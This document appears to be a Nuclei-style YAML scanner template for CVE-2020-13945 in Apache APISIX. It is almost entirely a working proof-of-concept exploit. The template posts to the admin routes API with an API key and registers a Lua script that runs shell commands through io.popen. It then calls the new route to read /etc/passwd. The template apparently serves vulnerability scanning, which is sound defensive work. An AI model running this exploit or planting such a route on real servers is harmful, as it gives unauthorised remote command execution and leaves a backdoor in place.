id: yaml-poc-apache-apisix-other-CVE-2020-13945
info:
  name: Yaml Poc Apache Apisix Other Cve 2020 13945
  author: converted
  severity: medium
  description: 'Converted from xpoc: yaml-poc-apache-apisix-other-CVE-2020-13945'
  tags: apache,cve
  classification:
    cve-id: CVE-2020-13945
  reference:
  - http://packetstormsecurity.com/files/166228/Apache-APISIX-Remote-Code-Execution.html
  - https://lists.apache.org/thread.html/r792feb29964067a4108f53e8579a1e9bd1c8b5b9bc95618c814faf2f%40%3Cdev.apisix.apache.org%3E
  - https://nvd.nist.gov/vuln/detail/CVE-2020-13945
  - https://packetstormsecurity.com/files/166228/Apache-APISIX-Remote-Code-Execution.html
http:
- method: POST
  path:
  - /apisix/admin/routes
  body: "{\r\n\"uri\": \"/{{s1}}\",\r\n\"script\": \"local _M = {} \\n function _M.access(conf,\
    \ ctx) \\n local os = require('os')\\n local args = assert(ngx.req.get_uri_args())\
    \ \\n local f = assert(io.popen(args.{{s2}}, 'r'))\\n local s = assert(f:read('*a'))\\\
    n ngx.say(s)\\n f:close()  \\n end \\nreturn _M\",\r\n\"upstream\": {\r\n\"type\"\
    : \"roundrobin\",\r\n\"nodes\": {\r\n\"example.com:80\": 1\r\n}\r\n}\r\n} "
  headers:
    Content-Type: application/json
    X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 201
- method: GET
  path:
  - /{{s1}}?{{s2}}=cat+/etc/passwd
